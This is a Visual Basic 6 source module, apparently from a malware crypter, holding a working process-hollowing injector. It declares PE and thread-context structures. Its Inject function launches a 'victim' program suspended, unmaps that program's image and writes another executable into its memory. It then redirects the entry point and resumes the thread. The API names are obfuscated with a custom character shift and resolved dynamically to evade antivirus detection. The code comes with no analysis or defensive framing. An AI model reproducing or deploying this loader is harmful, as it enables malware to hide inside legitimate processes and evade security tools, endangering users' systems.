Attribute VB_Name = "Module4"
Option Explicit

Const SIZE_OF_80387_REGISTERS = 80

Public Type FLOATING_SAVE_AREA
     ControlWord As Long
     StatusWord As Long
     TagWord As Long
     ErrorOffset As Long
     ErrorSelector As Long
     DataOffset As Long
     DataSelector As Long
     RegisterArea(1 To SIZE_OF_80387_REGISTERS) As Byte
     Cr0NpxState As Long
End Type

Public Type CONTEXT86
    ContextFlags As Long
    Dr0 As Long
    Dr1 As Long
    Dr2 As Long
    Dr3 As Long
    Dr6 As Long
    Dr7 As Long

    FloatSave As FLOATING_SAVE_AREA

    SegGs As Long
    SegFs As Long
    SegEs As Long
    SegDs As Long

    Edi As Long
    Esi As Long
    Ebx As Long
    Edx As Long
    Ecx As Long
    Eax As Long

    Ebp As Long
    Eip As Long
    SegCs As Long
    EFlags As Long
    Esp As Long
    SegSs As Long
End Type

Public Const CONTEXT_X86 = &H10000
Public Const CONTEXT86_CONTROL = (CONTEXT_X86 Or &H1)          'SS:SP, CS:IP, FLAGS, BP
Public Const CONTEXT86_INTEGER = (CONTEXT_X86 Or &H2)          'AX, BX, CX, DX, SI, DI
Public Const CONTEXT86_SEGMENTS = (CONTEXT_X86 Or &H4)         'DS, ES, FS, GS
Public Const CONTEXT86_FLOATING_POINT = (CONTEXT_X86 Or &H8)   '387 state
Public Const CONTEXT86_DEBUG_REGISTERS = (CONTEXT_X86 Or &H10) 'DB 0-3,6,7
Public Const CONTEXT86_FULL = (CONTEXT86_CONTROL Or CONTEXT86_INTEGER Or CONTEXT86_SEGMENTS)

Public Type PROCESS_INFORMATION
   hProcess As Long
   hThread As Long
   dwProcessId As Long
   dwThreadId As Long
End Type

Public Type STARTUPINFO
   cb As Long
   lpReserved As String
   lpDesktop As String
   lpTitle As String
   dwX As Long
   dwY As Long
   dwXSize As Long
   dwYSize As Long
   dwXCountChars As Long
   dwYCountChars As Long
   dwFillAttribute As Long
   dwFlags As Long
   wShowWindow As Integer
   cbReserved2 As Integer
   lpReserved2 As Long        'LPBYTE
   hStdInput As Long
   hStdOutput As Long
   hStdError As Long
End Type

Public Const CREATE_SUSPENDED = &H4
Public Const MEM_COMMIT As Long = &H1000&
Public Const MEM_RESERVE As Long = &H2000&
Public Const PAGE_NOCACHE As Long = &H200
Public Const PAGE_EXECUTE_READWRITE As Long = &H40
Public Const PAGE_EXECUTE_WRITECOPY As Long = &H80
Public Const PAGE_EXECUTE_READ As Long = &H20
Public Const PAGE_EXECUTE As Long = &H10
Public Const PAGE_READONLY As Long = &H2
Public Const PAGE_WRITECOPY As Long = &H8
Public Const PAGE_NOACCESS As Long = &H1
Public Const PAGE_READWRITE As Long = &H4

Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (dest As Any, Src As Any, ByVal l As Long)
'==========PE staff==============
Public Enum ImageSignatureTypes
    IMAGE_DOS_SIGNATURE = &H5A4D     ''\\ MZ
    IMAGE_OS2_SIGNATURE = &H454E     ''\\ NE
    IMAGE_OS2_SIGNATURE_LE = &H454C  ''\\ LE
    IMAGE_VXD_SIGNATURE = &H454C     ''\\ LE
    IMAGE_NT_SIGNATURE = &H4550      ''\\ PE00
End Enum

Public Type IMAGE_DOS_HEADER
    e_magic As Integer        ' Magic number
    e_cblp As Integer         ' Bytes on last page of file
    e_cp As Integer           ' Pages in file
    e_crlc As Integer         ' Relocations
    e_cparhdr As Integer      ' Size of header in paragraphs
    e_minalloc As Integer     ' Minimum extra paragraphs needed
    e_maxalloc As Integer     ' Maximum extra paragraphs needed
    e_ss As Integer           ' Initial (relative) SS value
    e_sp As Integer           ' Initial SP value
    e_csum As Integer         ' Checksum
    e_ip As Integer           ' Initial IP value
    e_cs As Integer           ' Initial (relative) CS value
    e_lfarlc As Integer       ' File address of relocation table
    e_ovno As Integer         ' Overlay number
    e_res(0 To 3) As Integer  ' Reserved words
    e_oemid As Integer        ' OEM identifier (for e_oeminfo)
    e_oeminfo As Integer      ' OEM information; e_oemid specific
    e_res2(0 To 9) As Integer ' Reserved words
    e_lfanew As Long          ' File address of new exe header
End Type

' MSDOS File header
Public Type IMAGE_FILE_HEADER
    Machine As Integer
    NumberOfSections As Integer
    TimeDateStamp As Long
    PointerToSymbolTable As Long
    NumberOfSymbols As Long
    SizeOfOptionalHeader As Integer
    characteristics As Integer
End Type

' Directory format.
Public Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long
    Size As Long
End Type

' Optional header format.
Public Const IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16

Public Type IMAGE_OPTIONAL_HEADER
    ' Standard fields.
    Magic As Integer
    MajorLinkerVersion As Byte
    MinorLinkerVersion As Byte
    SizeOfCode As Long
    SizeOfInitializedData As Long
    SizeOfUnitializedData As Long
    AddressOfEntryPoint As Long
    BaseOfCode As Long
    BaseOfData As Long
    ' NT additional fields.
    ImageBase As Long
    SectionAlignment As Long
    FileAlignment As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion As Integer
    MinorImageVersion As Integer
    MajorSubsystemVersion As Integer
    MinorSubsystemVersion As Integer
    W32VersionValue As Long
    SizeOfImage As Long
    SizeOfHeaders As Long
    CheckSum As Long
    SubSystem As Integer
    DllCharacteristics As Integer
    SizeOfStackReserve As Long
    SizeOfStackCommit As Long
    SizeOfHeapReserve As Long
    SizeOfHeapCommit As Long
    LoaderFlags As Long
    NumberOfRvaAndSizes As Long
    DataDirectory(0 To IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY
End Type

Public Type IMAGE_NT_HEADERS
    Signature As Long
    FileHeader As IMAGE_FILE_HEADER
    OptionalHeader As IMAGE_OPTIONAL_HEADER
End Type

' Section header
Const IMAGE_SIZEOF_SHORT_NAME = 8

Public Type IMAGE_SECTION_HEADER
   SecName As String * IMAGE_SIZEOF_SHORT_NAME
   VirtualSize As Long
   VirtualAddress  As Long
   SizeOfRawData As Long
   PointerToRawData As Long
   PointerToRelocations As Long
   PointerToLinenumbers As Long
   NumberOfRelocations As Integer
   NumberOfLinenumbers As Integer
   characteristics  As Long
End Type

Public Type SECURITY_ATTRIBUTES
        nLength As Long
        lpSecurityDescriptor As Long
        bInheritHandle As Long
End Type

Public Function Inject(ByVal sVictim As String, abExeFile() As Byte, Optional lpszCommandLine As String) As Long

    Dim idh As IMAGE_DOS_HEADER
    Dim xKernel As String
    Dim ImageBase As Long
    Dim addr As Long, lOffset As Long
    Dim s2 As String * 256
        Dim context As CONTEXT86
    Dim inh As IMAGE_NT_HEADERS
    Dim ish As IMAGE_SECTION_HEADER
    Dim pi As PROCESS_INFORMATION
    Dim Ret As Long
    Dim i As Long
Dim b2(0 To 1024) As Byte
    Dim si As STARTUPINFO
    Dim Saltar As String
    Saltar = "kernel32"
    xKernel = Saltar
        
    CopyMemory idh, abExeFile(0), Len(idh)
    If idh.e_magic <> IMAGE_DOS_SIGNATURE Then
        Inject = -1
       Exit Function
    End If
    CopyMemory inh, abExeFile(idh.e_lfanew), Len(inh)
    If inh.Signature <> IMAGE_NT_SIGNATURE Then
        Inject = -1
       Exit Function
    End If

    Dim s1 As String, b1() As Byte
    
    si.cb = Len(si)
    If lpszCommandLine = "" Then
        b1 = StrConv(sVictim, vbFromUnicode)
    Else
        b1 = StrConv(Chr(34) & sVictim & Chr(34) & " " & LTrim(lpszCommandLine), vbFromUnicode)
    End If
    s1 = vbNullString
    Dim sec1 As SECURITY_ATTRIBUTES, sec2 As SECURITY_ATTRIBUTES
    sec1.nLength = LenB(sec1)
    sec2.nLength = LenB(sec2)
    si.cb = LenB(si)
    si.dwFlags = 1
    si.wShowWindow = 5
    
'invoke CreateProcess,0,lpszPath, addr sec1, addr sec2, FALSE,pClass,0,addr szShellPath,addr sInfo, addr pInfo

If CallAPIByName(Saltar, ROT13("PrnÅr]|prÄÄN", True), StrPtr(s1), VarPtr(b1(0)), VarPtr(sec1), VarPtr(sec2), False, CREATE_SUSPENDED, 0, 0, VarPtr(si), VarPtr(pi)) = 0 Then
'MsgBox "Can not start victim process!", vbCritical
Exit Function
End If

context.ContextFlags = CONTEXT86_INTEGER
If CallAPIByName(Saltar, ROT13("TrÅaurnqP|{ÅrÖÅ", True), pi.hThread, VarPtr(context)) = 0 Then Inject = -1: GoTo ClearProcess
Call CallAPIByName(Saltar, ROT13("_rnq]|prÄÄZrz|Ü", True), pi.hProcess, context.Ebx + 8, VarPtr(addr), 4, 0)

If addr = 0 Then Inject = -1: GoTo ClearProcess
If CallAPIByName("ntdll.dll", ROT13("[Åb{zn}cvrÑ\s`rpÅv|{", True), pi.hProcess, addr) Then
If CallAPIByName(Saltar, ROT13("PrnÅr]|prÄÄN", True), StrPtr(s1), VarPtr(b1(0)), VarPtr(sec1), VarPtr(sec2), False, CREATE_SUSPENDED, 0, 0, VarPtr(si), VarPtr(pi)) = 0 Then
Exit Function
End If

context.ContextFlags = CONTEXT86_INTEGER
If CallAPIByName(Saltar, ROT13("TrÅaurnqP|{ÅrÖÅ", True), pi.hThread, VarPtr(context)) = 0 Then Inject = -1: GoTo ClearProcess
Call CallAPIByName(Saltar, ROT13("_rnq]|prÄÄZrz|Ü", True), pi.hProcess, context.Ebx + 8, VarPtr(addr), 4, 0)
If CallAPIByName("ntdll.dll", ROT13("gÑb{zn}cvrÑ\s`rpÅv|{", True), pi.hProcess, addr) Then GoTo ClearProcess
End If

ImageBase = CallAPIByName(Saltar, ROT13("cvÅÇnyNyy|pRÖ", True), pi.hProcess, inh.OptionalHeader.ImageBase, inh.OptionalHeader.SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE)

If ImageBase = 0 Then Inject = -1: GoTo ClearProcess
Call CallAPIByName(Saltar, ROT13("dvÅr]|prÄÄZrz|Ü", True), pi.hProcess, ImageBase, VarPtr(abExeFile(0)), inh.OptionalHeader.SizeOfHeaders, VarPtr(Ret))
lOffset = idh.e_lfanew + Len(inh)

For i = 0 To inh.FileHeader.NumberOfSections - 1
CopyMemory ish, abExeFile(lOffset + i * Len(ish)), Len(ish)
Call CallAPIByName(Saltar, ROT13("dvÅr]|prÄÄZrz|Ü", True), pi.hProcess, ImageBase + ish.VirtualAddress, VarPtr(abExeFile(ish.PointerToRawData)), ish.SizeOfRawData, VarPtr(Ret))
Next i

Call CallAPIByName(Saltar, ROT13("dvÅr]|prÄÄZrz|Ü", True), pi.hProcess, context.Ebx + 8, VarPtr(ImageBase), 4, VarPtr(Ret))
context.Eax = ImageBase + inh.OptionalHeader.AddressOfEntryPoint
Call CallAPIByName(Saltar, ROT13("`rÅaurnqP|{ÅrÖÅ", True), pi.hThread, VarPtr(context))
Call CallAPIByName(Saltar, ROT13("_rÄÇzraurnq", True), pi.hThread)
Inject = pi.dwProcessId
Exit Function
    
ClearProcess:
CallAPIByName "Saltar", ROT13("Py|ÄrUn{qyr", True), pi.hThread
CallAPIByName "Saltar", ROT13("Py|ÄrUn{qyr", True), pi.hProcess
End Function








